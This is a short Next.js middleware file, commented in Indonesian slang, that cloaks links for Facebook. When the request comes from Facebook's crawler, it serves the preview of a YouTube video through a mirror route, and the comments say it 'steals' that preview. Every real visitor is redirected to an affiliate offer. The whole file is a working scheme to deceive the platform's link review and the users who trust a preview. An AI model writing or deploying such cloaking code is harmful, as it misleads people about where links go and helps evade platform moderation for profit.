import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(req: NextRequest) {
  const ua = req.headers.get('user-agent') || '';
  
  // LINK DUIT LO
  const linkOffer = "https://link-affiliate-lo.com"; 
  // LINK TARGET (YouTube/Berita) yang mau dicolong preview-nya
  const linkTarget = "https://youtu.be/apkf6gfVpiA?si=jKEQXuR9cOGTao8q";

  const isFb = ua.includes('facebookexternalhit') || ua.includes('Facebot');

  if (isFb) {
    // Paksa Facebook buat 'ngintip' isi YouTube lewat API Mirror kita
    return NextResponse.rewrite(new URL(`/api/mirror?target=${encodeURIComponent(linkTarget)}`, req.url));
  }

  // Orang beneran langsung ke link duit
  return NextResponse.redirect(linkOffer);
}

export const config = { matcher: '/' };
